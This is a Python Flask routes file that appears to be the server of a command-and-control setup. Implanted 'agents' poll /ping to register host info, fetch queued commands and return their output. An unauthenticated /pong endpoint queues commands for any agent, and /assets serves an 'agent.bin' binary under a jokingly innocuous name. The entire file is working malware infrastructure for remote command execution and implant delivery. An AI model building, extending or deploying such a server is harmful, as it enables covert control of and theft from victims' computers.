from flask import Blueprint, request, send_file
from server.db import save_result, register_agent
import uuid


routes = Blueprint("routes", __name__)
_pending = {}
_sent = {}


@routes.get("/")
def healthcheck():
    return "ok", 200


@routes.post("/ping")
def sync():
    agent_id = request.headers.get("X-Session-Id")
    cmd = _pending.get(agent_id) 

    data = request.get_json()
    output = data.get("output")
    info = data.get("info", {})

    if not agent_id:
        return {"error": "missing X-Session-Id"}, 400

    register_agent(agent_id, info)
    
    if output and _sent.get(agent_id):
        save_result(
            agent_id=agent_id,
            task_id=str(uuid.uuid4()),
            command=_sent.get(agent_id),
            output=output
        )
        _sent[agent_id] = None
    
    if cmd:
        _pending[agent_id] = None
        _sent[agent_id] = cmd

        return {"cmd": cmd}, 200

    return {"cmd": None}, 200


@routes.post("/pong")
def command():
    data = request.get_json()
    agent_id = data.get("agent_id")
    cmd = data.get("cmd")

    if not agent_id or not cmd:
        return {"error": "missing fields"}, 400

    _pending[agent_id] = cmd
    return "ok", 200


@routes.get("/assets") # what an asset innit
def serve_bin():
    return send_file("agent.bin", mimetype="application/octet-stream")

